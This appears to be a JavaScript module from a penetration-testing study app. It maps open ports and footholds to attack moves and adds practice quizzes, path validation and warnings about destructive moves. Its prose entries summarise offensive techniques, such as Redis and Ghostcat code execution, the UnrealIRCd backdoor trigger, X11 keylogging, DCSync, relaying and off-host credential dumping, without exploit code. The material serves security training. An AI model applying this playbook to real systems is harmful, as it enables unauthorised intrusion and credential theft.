    { key: 'p5985', tier: 'ports', port: '5985/5986', short: '5985 WinRM', proto: 'tcp', fam: 'remote', label: 'WinRM', signal: 'Windows remote management. With a credential it is an interactive shell (evil-winrm), your way onto and through Windows hosts.', seed: ['lateral-exec', 'win-interactive-shell', 'pass-the-hash', 'local-windows-interfaces', 'local-windows-routes', 'local-windows-neighbors', 'local-windows-listeners', 'local-windows-dns'] },
    { key: 'p6000', tier: 'ports', port: '6000', short: '6000 X11', proto: 'tcp', fam: 'remote', label: 'X11', signal: 'A desktop display with access control off. Any network client can screenshot the session, log keystrokes as they are typed, and inject input, all as the logged-in user.', seed: ['recon-x11', 'x11-keylog'] },
    { key: 'p6379', tier: 'ports', port: '6379', short: '6379 Redis', proto: 'tcp', fam: 'db', label: 'Redis', signal: 'Often unauthenticated. INFO reads the host, and a writable Redis can drop an SSH key or a web shell, which is a direct foothold.', seed: ['redis-enum', 'redis-lua-sandbox', 'redis-rogue-server-rce', 'ssh-key-login', 'shell-listener'] },
    { key: 'p6667', tier: 'ports', port: '6667/6697', short: '6667 IRC', proto: 'tcp', fam: 'remote', label: 'IRC (UnrealIRCd)', signal: 'Chat daemon. UnrealIRCd 3.2.8.1 shipped with a trojaned source archive that executes any command prefixed with AB; over the socket.', seed: ['unrealircd-backdoor', 'distccd-rce'] },
    { key: 'p1099', tier: 'ports', port: '1099', short: '1099 Java RMI', proto: 'tcp', fam: 'web', label: 'Java RMI', signal: 'A Java RMI registry. List the bound objects, then a deserialization gadget (ysoserial via remote-method-guesser) turns a remote method call into code execution.', seed: ['java-rmi'] },
    { key: 'p8009', tier: 'ports', port: '8009', short: '8009 AJP', proto: 'tcp', fam: 'web', label: 'AJP (Tomcat)', signal: 'Tomcat\'s AJP connector. Ghostcat (CVE-2020-1938) reads any file under the web root, and includes an uploaded file as JSP for code execution.', seed: ['ajp-ghostcat'] },
    { key: 'p8080', tier: 'ports', port: '8080/8443/8082', short: '8080/8443 App', proto: 'tcp', fam: 'web', label: 'HTTP-alt (Tomcat, Jenkins, JBoss)', signal: 'App servers. Tomcat Manager deploys a WAR, and the Jenkins script console runs Groovy. Both are code execution once you have credentials.', seed: ['tomcat-deploy', 'jenkins-access', 'jboss-jmx-deploy', 'weblogic-rce', 'spring4shell', 'spring-actuator-jolokia', 'ofbiz-deser', 'confluence-ognl-rce', 'grafana-file-read', 'h2-database-console-rce'] },
    { key: 'p8089', tier: 'ports', port: '8089/8000', short: '8089 Splunk', proto: 'tcp', fam: 'web', label: 'Splunkd Management & UI', signal: 'Splunk management REST port (8089) and web interface (8000). Authenticated admins or unauthenticated free-license instances can deploy a scripted-input app for immediate code execution.', seed: ['splunk-app-rce'] },
    { key: 'p10000', tier: 'ports', port: '10000/20000', short: '10000 Webmin', proto: 'tcp', fam: 'web', label: 'Webmin, Usermin', signal: 'Perl web admin panels. Old Webmin (10000) and Usermin (20000) builds carry unauthenticated command injection in their password and login flows, a direct root shell when the version matches.', seed: ['webmin-rce', 'usermin-rce'] },
    { key: 'p10050', tier: 'ports', port: '10050/10051', short: '10050 Zabbix', proto: 'tcp', fam: 'web', label: 'Zabbix Agent & Server', signal: 'Zabbix monitoring agent (10050), server (10051), and web frontend. SAML SSO bypass or EnableRemoteCommands runs OS commands on monitored hosts.', seed: ['zabbix-script-rce'] },
    { key: 'p9200', tier: 'ports', port: '9200/5984/9042', short: '9200 Elastic/DB', proto: 'tcp', fam: 'db', label: 'Elasticsearch, CouchDB, Cassandra', signal: 'JSON REST and NoSQL data stores, often unauthenticated. List indices/databases and dump stored records; CouchDB Admin Party or old Elastic scripting yields RCE.', seed: ['elasticsearch-enum', 'elasticsearch-rce', 'couchdb-admin-party', 'cassandra-cql-enum', 'sqlite-db-dump', 'sqlite-table-extract'], lanes: ['database'] },
    { key: 'p11211', tier: 'ports', port: '11211', short: '11211 Memcached', proto: 'tcp', fam: 'db', label: 'Memcached', signal: 'An in-memory cache with no auth by design. Dump the cached keys for session tokens and secrets the application left in memory.', seed: ['memcached-enum'] },
    { key: 'p27017', tier: 'ports', port: '27017', short: '27017 MongoDB', proto: 'tcp', fam: 'db', label: 'MongoDB', signal: 'Historically no auth. If you can list the databases you can read them, and hashes and API keys sit in plain collections.', seed: ['mongo-enum', 'nosqli-regex-extract'] },
    { key: 'p61616', tier: 'ports', port: '61616/8161', short: '61616 ActiveMQ', proto: 'tcp', fam: 'web', label: 'Apache ActiveMQ (OpenWire)', signal: 'Message broker OpenWire transport (61616) and web console (8161). Unpatched brokers allow unauthenticated ClassPathXmlApplicationContext deserialization (CVE-2023-46604).', seed: ['activemq-openwire-rce'] },
    { key: 'p1978', tier: 'ports', port: '1978', short: '1978 WiFiMouse', proto: 'tcp', fam: 'remote', label: 'WiFi Mouse Server', signal: 'A phone-to-PC remote-control server. Its authentication is client-side only, so file-execution events can be sent unauthenticated to run a program as the logged-in desktop user.', seed: ['wifi-mouse-rce'] },
    { key: 'p3000', tier: 'ports', port: '3000-3003', short: '3000 Aerospike', proto: 'tcp', fam: 'db', label: 'Aerospike', signal: 'A high-speed database. Old versions let an unauthenticated client register a Lua user-defined function that runs OS commands as the aerospike service user.', seed: ['aerospike-udf', 'aerospike-udf-rce'] },
    { key: 'p8000', tier: 'ports', port: '8000/8787/5005', short: '8000 JDWP', proto: 'tcp', fam: 'remote', label: 'JDWP (Java debug)', signal: 'A Java Debug Wire Protocol port. Anyone who can reach it can invoke methods in the running JVM, which is code execution as the JVM user. Often bound to localhost, so reach it through a pivot.', seed: ['jdwp-debug'] },
    { key: 'p8021', tier: 'ports', port: '8021', short: '8021 FreeSWITCH', proto: 'tcp', fam: 'remote', label: 'FreeSWITCH Event Socket', signal: 'The control socket of the FreeSWITCH VoIP server. With the default ClueCon password and no ACL, any client can run OS commands through its API.', seed: ['freeswitch-esl'] },
    // once you are in: the evidence is no longer a port but what you are holding
    { key: 'shell-linux', tier: 'access', port: '', short: 'Linux Shell', proto: '', fam: 'access', label: 'You have a shell on Linux', signal: 'You landed a foothold, so the box itself is now the signal. Before escalating, enumerate: sudo rights, SUID bits, capabilities, cron jobs, and loot all point the way to root.', seed: ['shell-listener', 'egress-blocked-shell', 'shell-revshell-linux', 'shell-bind', 'shell-msfvenom', 'shell-transfer-linux', 'shell-pty-upgrade', 'fix-no-tty', 'fix-tool-wont-run', 'linux-remote-exec'], lanes: ['linux', 'shells'] },
    { key: 'shell-windows', tier: 'access', port: '', short: 'Windows Shell', proto: '', fam: 'access', label: 'You have a shell on Windows', signal: 'You landed on a Windows host. Check your privileges first: a single enabled token privilege, a weak service, or a saved credential is usually the whole way to SYSTEM.', seed: ['shell-listener', 'shell-revshell-windows', 'shell-transfer-windows', 'remote-app-creds', 'bypass-amsi', 'potato-select'], lanes: ['windows'] },
    { key: 'offline-hash', tier: 'access', port: '', short: 'Offline Hash', proto: '', fam: 'access', label: 'You have a hash (crack it offline)', signal: 'A hash in hand is a credential you have not spent yet. Identify the type, pick the matching mode, and crack it offline where there is no lockout.', seed: ['crack-identify', 'crack-hash-troubleshoot', 'crack-ntlm', 'crack-netntlmv2', 'crack-kerberoast', 'crack-asrep-offline', 'crack-shadow', 'crack-archive', 'crack-mscache2', 'crack-asrep', 'crack-tgs', 'cred-crack-asrep', 'cred-crack-tgs', 'cred-crack-ntlm', 'cred-crack-netntlm', 'cred-crack-shadow', 'cred-crack-sshkey', 'cred-crack-zip', 'cred-crack-keepass', 'cred-crack-dcc2', 'dpapi-masterkey-cred', 'vnc-decrypt', 'keepass-dump-recover', 'cisco-decrypt'], lanes: ['creds'] },
    { key: 'domain-cred', tier: 'access', port: '', short: 'Domain Cred', proto: '', fam: 'ad', label: 'You have a valid domain credential', signal: 'One domain account changes everything. Map the attack paths, roast service accounts, abuse ACLs and delegation, and walk the graph toward Domain Admin.', seed: ['validate-credential', 'fix-clock-skew', 'account-password-change', 'fix-acl-reauth', 'ntlm-disabled-kerberos', 'auth-account-blocked', 'kerberos-spn-fix', 'relay-target-signing', 'responder-tune', 'bloodhound-collect', 'ad-path-manual', 'powerview-enum', 'ad-psdotnet-enum', 'kerberoast', 'ad-acl-abuse', 'ad-dacl-abuse', 'bloodyad-acl', 'gpo-abuse', 'dnsadmins-abuse', 'shadow-credentials', 'adcs-shadow-creds', 'delegation-abuse', 'constrained-delegation', 'rbcd-attack', 'getst-impersonation', 'unconstrained-delegation', 'adcs-esc', 'certipy-find', 'adcs-esc4-template', 'adcs-esc8-relay', 'cert-authenticate', 'dcsync', 'golden-ticket', 'silver-ticket', 'diamond-ticket', 'ticket-reuse', 'sid-history-abuse', 'trust-enum', 'ad-trust-enum', 'laps-read', 'ad-laps-read', 'gmsa-read', 'ad-gmsa-abuse', 'own-domain-pth', 'pass-the-hash', 'zerologon-check', 'zerologon-exploit', 'nopac', 'printnightmare', 'ms14-068', 'wsus-abuse', 'sccm-enum', 'sccm-exploit', 'certifried', 'adcs-certifried', 'kerberos-relay', 'adidns-abuse', 'timeroasting'], lanes: ['ad'] },
    { key: 'pivot', tier: 'access', port: '', short: 'Pivot Host', proto: '', fam: 'access', label: 'You have a foothold on a dual-homed host', signal: 'The box you own can reach a network you cannot. Enumerate its interfaces and routes, stand up a tunnel, and scan the subnet behind it.', seed: [], lanes: ['pivot'] },
    { key: 'proof', tier: 'access', port: '', short: 'Root / SYSTEM', proto: '', fam: 'access', label: 'You have root or SYSTEM (capture the proof)', signal: 'The objective. Grab the user and root flags, and capture the proof the report needs.', seed: [], lanes: ['proof'] },
  ];
  function evidenceMoves(seedIds) {
    var ms = [], seen = {};
    seedIds.forEach(function (id) { var m = byId(id); if (m && !seen[id]) { seen[id] = 1; ms.push(m); } });
    return topoOrder(ms).map(function (m) { return { id: m.id, title: m.title, laneKey: (laneEntry(m.id) || {}).laneKey || '', cat: categoryOf(m.id), phase: deriveStage(m) }; });
  }
  function evidence() {
    return EVIDENCE.map(function (e) {
      var seed = (e.seed || []).slice();
      (e.lanes || []).forEach(function (lk) { lane(lk).forEach(function (n) { if (seed.indexOf(n.id) < 0) seed.push(n.id); }); });
      return { key: e.key, tier: e.tier, port: e.port || '', short: e.short || e.label, proto: e.proto || '', fam: e.fam || '', label: e.label, signal: e.signal, moves: evidenceMoves(seed) };
    }).filter(function (e) { return e.moves.length; });
  }
  // moves that never appear under any evidence entry (coverage guard for the by-evidence view)
  function evidenceGaps() {
    var seen = {}; evidence().forEach(function (e) { e.moves.forEach(function (m) { seen[m.id] = 1; }); });
    return allMoves().map(function (m) { return m.id; }).filter(function (id) { return !seen[id]; });
  }

  // --- "Your turn" practice --------------------------------------------------------------------
  function factsInHandAt(moveId, seq) {
    var have = {}, m = byId(moveId);
    if (m) reqSet(m).forEach(function (k) { have[k] = 1; });
    var order = seq && seq.length ? seq : lane((laneEntry(moveId) || {}).laneKey).map(function (n) { return n.id; });
    for (var i = 0; i < order.length; i++) { if (order[i] === moveId) break; var pm = byId(order[i]); if (pm) (pm.produces || []).forEach(function (k) { have[k] = 1; }); }
    return Object.keys(have);
  }
  function practiceFor(moveId, seq) {
    var m = byId(moveId); if (!m) return null;
    var fx = fixtures()[moveId] || {};
    var have = factsInHandAt(moveId, seq);
    var ids = (fx.choices && fx.choices.length) ? fx.choices.slice() : autoChoices(moveId);
    if (ids.indexOf(moveId) < 0) ids.unshift(moveId);
    var coach = fx.coach || {};
    var choices = ids.map(function (id) {
      var d = byId(id); if (!d) return null;
      var verdict, missing = [];
      if (id === moveId) verdict = 'correct';
      else {
        var all = d.requires_all || [], any = d.requires_any || [];
        var allMet = all.every(function (r) { return have.indexOf(r) >= 0; });
        var anyMet = any.length === 0 || any.some(function (r) { return have.indexOf(r) >= 0; });
        missing = all.filter(function (r) { return have.indexOf(r) < 0; });
        if (!anyMet) missing.push('one of: ' + any.join(' / '));
        verdict = (allMet && anyMet) ? 'alt' : 'locked';
      }
      return { id: id, title: d.title, verdict: verdict, missing: missing, coach: coach[id] || '' };
    }).filter(Boolean);
    for (var j = choices.length - 1; j > 0; j--) { var r = Math.floor(Math.random() * (j + 1)); var t = choices[j]; choices[j] = choices[r]; choices[r] = t; }
    return { moveId: moveId, situation: fx.situation || '', have: have, choices: choices };
  }
  // when a move has no authored choices, draw distractors from its lane neighbours
  function autoChoices(moveId) {
    var N = lane((laneEntry(moveId) || {}).laneKey).map(function (n) { return n.id; });
    var i = N.indexOf(moveId), out = [moveId];
    [i + 1, i - 1, i + 2].forEach(function (k) { if (k >= 0 && k < N.length && N[k] !== moveId && out.indexOf(N[k]) < 0) out.push(N[k]); });
    return out.slice(0, 4);
  }

  // --- mastery (per-browser) -------------------------------------------------------------------
  var MKEY = 'obol.study-mastery';
  function mastery() { try { return JSON.parse(localStorage.getItem(MKEY) || '{}') || {}; } catch (e) { return {}; } }
  function markStudied(id, kind) { try { var m = mastery(); m[id] = Object.assign({ studied: false, correct: false }, m[id]); if (kind === 'studied') m[id].studied = true; if (kind === 'correct') { m[id].studied = true; m[id].correct = true; } localStorage.setItem(MKEY, JSON.stringify(m)); } catch (e) {} }
  function laneProgress(key) { var ids = lane(key).map(function (n) { return n.id; }), m = mastery(); var s = 0, c = 0; ids.forEach(function (id) { if (m[id] && m[id].studied) s++; if (m[id] && m[id].correct) c++; }); return { total: ids.length, studied: s, correct: c }; }

  // --- path validation: does each step's prereqs hold given the steps before it? ----------------
  function validatePath(ids) {
    var have = {}, issues = [];
    ids.forEach(function (id, i) {
      var m = byId(id); if (!m) { issues.push({ idx: i, id: id, kind: 'unknown' }); return; }
      var all = m.requires_all || [], any = m.requires_any || [];
      var missAll = all.filter(function (r) { return !have[r] && !isExternal(r); });
      var anyOk = any.length === 0 || any.some(function (r) { return have[r] || isExternal(r); });
      if (missAll.length || !anyOk) issues.push({ idx: i, id: id, kind: 'prereq', missing: missAll.concat(anyOk ? [] : ['one of: ' + any.join(' / ')]) });
      (m.produces || []).forEach(function (p) { have[p] = 1; });
    });
    return { ok: !issues.length, issues: issues };
  }
  // facts an opening move needs that come "from the environment" (a target, reachability) - not from
  // another move - so a path that starts mid-stream isn't flagged for them.
  function isExternal(fact) { return /^(target\.|host\.up|ports\.open|port:|.*\.reachable$|http\.reachable|foothold\.)/.test(fact); }

  // --- signal recognition helpers: the "so what" behind evidence -------------------------------
  function friendly(k) { try { return (OBOL.pack && OBOL.pack.friendly) ? OBOL.pack.friendly(k) : k; } catch (e) { return k; } }
  // the hand-written "why this, why now" teaching note for a move (fixtures carry it as `why`); empty
  // when none is authored yet, so the route can fall back to the derived dependency explanation.
  function whyNow(moveId) { var fx = fixtures()[moveId] || {}; return fx.why || ''; }
  // the hand-written "how to actually do it" field notes for a move (fixtures carry it as `how`):
  // { lead: '…', items: [{ t: 'technique', d: 'how' }, …] }. Empty when none is authored yet.
  function howTo(moveId) { var fx = fixtures()[moveId] || {}; var h = fx.how; return (h && h.items && h.items.length) ? h : null; }
  // the "why this line matters" read-out for a move's highlighted signal
  function signalTell(moveId) {
    var m = byId(moveId); if (!m) return null;
    var fx = fixtures()[moveId] || {};
    var proves = (m.produces || []).map(function (f) { return { fact: f, label: friendly(f) }; });
    var opens = opensNext(m).slice(0, 5).map(function (x) { return { id: x.id, title: x.title }; });
    var gist = proves.length
      ? ('This line is your proof that you now have ' + proves[0].label + (opens.length ? ', which is exactly what ' + opens[0].title + ' needs next.' : '.'))
      : 'This line is the result that confirms the step worked.';
    return { signal: fx.signal || '', proves: proves, opens: opens, gist: gist, teach: fx.teach || '' };
  }
  // one fact, made first-class: what produces it, and what it then unlocks
  function factInfo(fact) {
    return {
      fact: fact, label: friendly(fact),
      producedBy: allMoves().filter(function (m) { return (m.produces || []).indexOf(fact) >= 0; }).map(function (m) { return { id: m.id, title: m.title }; }),
      unlocks: allMoves().filter(function (m) { return reqSet(m).indexOf(fact) >= 0; }).map(function (m) { return { id: m.id, title: m.title }; }),
    };
  }
  // other moves that reach the same outcome (share a produced fact) - the candidates for "which, when?"
  function alternativesFor(moveId) {
    var m = byId(moveId); if (!m) return [];
    var prod = m.produces || []; if (!prod.length) return [];
    var out = [];
    allMoves().forEach(function (x) {
      if (x.id === moveId) return;
      var shared = (x.produces || []).filter(function (p) { return prod.indexOf(p) >= 0; });
      if (shared.length) out.push({ id: x.id, title: x.title, shared: shared });
    });
    return out;
  }

  // --- scope-safety: which moves are loud or can break things (teach when NOT to fire) ----------
  var SCOPE = {
    'eternalblue': { level: 'destructive', note: 'The SMBv1 exploit can blue-screen the target. Confirm it is a lab box, not a honeypot, before you fire it.' },
    'zerologon-check': { level: 'loud', note: 'The check itself is safe; the exploit it leads to is destructive.' },
    'zerologon-exploit': { level: 'destructive', note: 'Resets the DC machine password and breaks its secure channel. You MUST restore the original password afterward or you take the domain down.' },
    'dnsadmins-abuse': { level: 'loud', note: 'Requires restarting the DNS service on a DC, which is noisy and disruptive.' },
    'printnightmare': { level: 'loud', note: 'Loads a driver through the print spooler and can be unstable on some builds.' },
    'nopac': { level: 'loud', note: 'Creates a machine account and forges a ticket. Unpatched DCs only.' },
    'coerce-auth': { level: 'loud', note: 'Forces a target to authenticate to you. Obvious in logs.' },
    'responder-poison': { level: 'loud', note: 'Poisons name resolution for the whole segment and can affect machines you did not intend. Scope it carefully.' },
    'ntlm-relay-attack': { level: 'loud', note: 'Active on the wire; logs an authentication on the relayed host.' },
    'mitm6-ipv6-takeover': { level: 'loud', note: 'Rogue DHCPv6 and DNS affect every Windows host on the segment. Scope it carefully.' },
    'online-brute-ssh': { level: 'loud', note: 'Failed logins are logged and can lock accounts. Keep the list small.' },
    'blind-brute-ssh': { level: 'loud', note: 'Blind common-user brute: the loudest option, logged and lockout-prone. Last resort only, keep the user list short.' },
    'online-brute-ftp': { level: 'loud', note: 'Failed logins are logged and can lock accounts.' },
    'online-brute-rdp': { level: 'loud', note: 'RDP lockout is unforgiving. Use one password at a time.' },
    'password-spray': { level: 'loud', note: 'One password across many users avoids lockout, but the failed logons are still logged. Read the policy first.' },
    'dcsync': { level: 'loud', note: 'Replication from a non-DC account stands out in the logs.' },
    'golden-ticket': { level: 'loud', note: 'Post-compromise persistence that forges tickets bypassing normal auth.' },
    'linux-persistence': { level: 'loud', note: 'Adds a durable way back in. On a real engagement this is scoped, logged, and cleaned up.' },
    'windows-persistence': { level: 'loud', note: 'Adds a local admin account. Scope it, log it, and remove it afterward.' },
  };
  function scopeSafety(moveId) { return SCOPE[moveId] || { level: 'safe', note: '' }; }

  // --- "which tool, when?": curated tradeoff decisions over moves that reach the same outcome ----
  var DECISIONS = [
    { key: 'ad-paths', moves: ['bloodhound-collect', 'ad-path-manual', 'powerview-enum'],
      question: 'BloodHound, bloodyAD, or PowerView to work AD attack paths?',
      pick: 'BloodHound to discover', rule: 'Use BloodHound to DISCOVER the path, then bloodyAD to EXECUTE a known edge.',
      unless: 'you cannot exfil a large collection or need to stay quiet (go straight to bloodyAD), or you are already on a Windows box with no way to upload (use PowerView in memory).',
      detail: [
        { id: 'bloodhound-collect', when: 'You want to see the whole domain and have it compute the shortest path for you. Heavier: it collects a large dataset, wants the GUI to analyse, and the collection is noisy.' },
        { id: 'ad-path-manual', when: 'You already know or suspect the edge and want to act on it surgically from the command line. Light and quiet, no big collection, but you have to know what you are looking for.' },
        { id: 'powerview-enum', when: 'You are on a Windows foothold and cannot upload tools. Loads in memory and queries live, at the cost of running on the target.' },
      ] },
    { key: 'dump-creds', moves: ['dcsync', 'dump-secrets', 'lsass-dump-onbox'],
      question: 'Dump credentials remotely, or on the host with mimikatz?',
      pick: 'Remotely', rule: 'Default to the remote dump. It is fast, uploads nothing, and never touches AV on the host.',
      unless: 'remote is blocked, or you specifically need the live secrets that only exist in memory (cleartext passwords, the Kerberos tickets of logged-in users), which are not in the SAM or NTDS. Then dump LSASS on the host.',
      detail: [
        { id: 'dcsync', when: 'You hold replication rights. Pulls every hash in the domain from the DC over the network, in seconds, with nothing uploaded.' },
        { id: 'dump-secrets', when: 'You have admin on a host and want its local SAM and LSA, remotely, with no shell needed.' },
        { id: 'lsass-dump-onbox', when: 'You need what is only in memory right now: cleartext passwords and the tickets of other logged-in users, none of which live in the SAM or NTDS. Slower and more tedious, runs on the host, and is exactly what AV watches most closely. Reach for it only when the fast remote dump cannot give you the live secret you are after.' },
      ] },
    { key: 'relay-or-crack', moves: ['ntlm-relay-attack', 'crack-netntlmv2'],
      question: 'A captured NetNTLMv2 hash: relay it, or crack it?',
      pick: 'Relay it', rule: 'If SMB signing is off on a host where the victim is a local admin, relay the authentication straight to it. No cracking, no password needed.',
      unless: 'signing is on everywhere (nothing to relay to) or you want the actual cleartext password to reuse elsewhere. Then crack it offline.',
      detail: [
        { id: 'ntlm-relay-attack', when: 'Signing is off and a reachable target has the victim as admin. Instant access, nothing to crack, but it needs a valid relay target.' },
        { id: 'crack-netntlmv2', when: 'You cannot relay, or you want the plaintext to reuse on services that will not accept a hash. Offline and no lockout, but only if the password is in your wordlist.' },
      ] },
    { key: 'capture-auth', moves: ['responder-poison', 'coerce-auth'],
      question: 'Wait for authentication with Responder, or coerce it?',
      pick: 'Coerce it', rule: 'If you can, force a chosen host to authenticate to you with a coercion tool. You get the hash on demand instead of hoping for traffic.',
      unless: 'you expect organic traffic (a busy segment, a user about to log on) or want to stay passive and quiet. Then just listen with Responder.',
      detail: [
        { id: 'responder-poison', when: 'Passive. Catches the authentication that happens to come your way. Quiet, but on a dead network you wait forever.' },
        { id: 'coerce-auth', when: 'Active. Forces a specific target to authenticate to you right now. Reliable, but obvious in the logs.' },
      ] },
    { key: 'crack-engine', moves: ['crack-ntlm', 'crack-netntlmv2', 'crack-kerberoast', 'crack-asrep-offline', 'crack-shadow', 'crack-mscache2', 'crack-tgs', 'crack-asrep', 'crack-archive'],
      question: 'hashcat or john to crack a hash?',
      pick: 'hashcat', rule: 'Default to hashcat. On a GPU it is far faster, and its mode numbers are well documented.',
      unless: 'you are CPU-only, or the hash is an odd format hashcat has no clean mode for. Then john, which has the widest format support and the bundled zip2john and ssh2john extractors.',
      detail: [
        { id: 'crack-ntlm', when: 'Applies to every crack step: hashcat for raw speed on a GPU, john for format breadth and its *2john helpers when you are extracting a hash from a file.' },
      ] },
  ];
  function decisionFor(moveId) { return DECISIONS.filter(function (d) { return d.moves.indexOf(moveId) >= 0; }); }

  // --- diagnosis practice: read raw output, name what you now have (facts, not moves) -----------
  var FACTPOOL = null;
  function factPool() {
    if (FACTPOOL) return FACTPOOL;
    var set = {}; allMoves().forEach(function (m) { (m.produces || []).forEach(function (f) { set[f] = 1; }); });
    FACTPOOL = Object.keys(set);
    return FACTPOOL;
  }
  function shuffle(a) { for (var i = a.length - 1; i > 0; i--) { var r = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[r]; a[r] = t; } return a; }
  function practiceDiagnose(moveId) {
    var cell = cellFor(moveId); if (!cell || !cell.output || !cell.output.text) return null;
    var m = byId(moveId); var correct = (m.produces || [])[0]; if (!correct) return null;
    var mine = {}; (m.produces || []).forEach(function (f) { mine[f] = 1; });
    var pool = {};
    lane((laneEntry(moveId) || {}).laneKey).forEach(function (n) { var nm = byId(n.id); if (nm) (nm.produces || []).forEach(function (f) { if (!mine[f]) pool[f] = 1; }); });
    var distract = shuffle(Object.keys(pool));
    if (distract.length < 3) { shuffle(factPool()).forEach(function (f) { if (!mine[f] && distract.indexOf(f) < 0 && distract.length < 3) distract.push(f); }); }
    distract = distract.slice(0, 3);
    var choices = distract.map(function (f) { return { fact: f, label: friendly(f), correct: false }; });
    choices.push({ fact: correct, label: friendly(correct), correct: true });
    return { moveId: moveId, title: cell.title, output: cell.output.text, signal: cell.output.signal,
      question: 'You ran this step and got the output above. What does it tell you that you now have?',
      choices: shuffle(choices),
      why: 'That output line is the evidence you now hold ' + friendly(correct) + ', which is what the next move needs.' };
  }

  // --- scaffolding level: how much "why" to show. Fades as a move is mastered, or set manually ---
  var CKEY = 'obol.study-coach';
  function coachPref() { try { return localStorage.getItem(CKEY) || 'always'; } catch (e) { return 'always'; } }
  function setCoachPref(v) { try { localStorage.setItem(CKEY, v); } catch (e) {} }
  function showWhy(moveId) { var p = coachPref(); if (p === 'always') return true; if (p === 'off') return false; var mk = mastery()[moveId] || {}; return !mk.correct; }

  OBOL.study = {
    LANE_DEFS: LANE_DEFS, LANE_KEYS: LANE_KEYS,
    lanes: lanes, lane: lane, laneEdges: laneEdges, laneEntry: laneEntry, laneNext: laneNext,
    atlas: atlas, scenarios: scenarios, scenarioCats: scenarioCats, scenario: scenario, simFor: simFor,
    evidence: evidence, evidenceGaps: evidenceGaps,
    cmdLocus: cmdLocus, detectPrompt: detectPrompt, switchesFor: switchesFor, tokenizeCmd: tokenizeCmd, blockersFor: blockersFor, nextPreviewFor: nextPreviewFor, cellFor: cellFor, replayFor: replayFor, practiceFor: practiceFor, practiceDiagnose: practiceDiagnose,
    producersOf: producersOf, opensNext: opensNext, pathTo: pathTo, leadupFor: leadupFor,
    categoryOf: categoryOf, CATEGORY_ORDER: CATEGORY_ORDER,
    signalTell: signalTell, whyNow: whyNow, howTo: howTo, factInfo: factInfo, alternativesFor: alternativesFor, decisionFor: decisionFor, scopeSafety: scopeSafety,
    coachPref: coachPref, setCoachPref: setCoachPref, showWhy: showWhy,
    mastery: mastery, markStudied: markStudied, laneProgress: laneProgress, validatePath: validatePath,
    // back-compat for tests
    get AD_LANE() { return lane('ad'); },
    get LANE_ORDER() { return LANE_KEYS; },
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
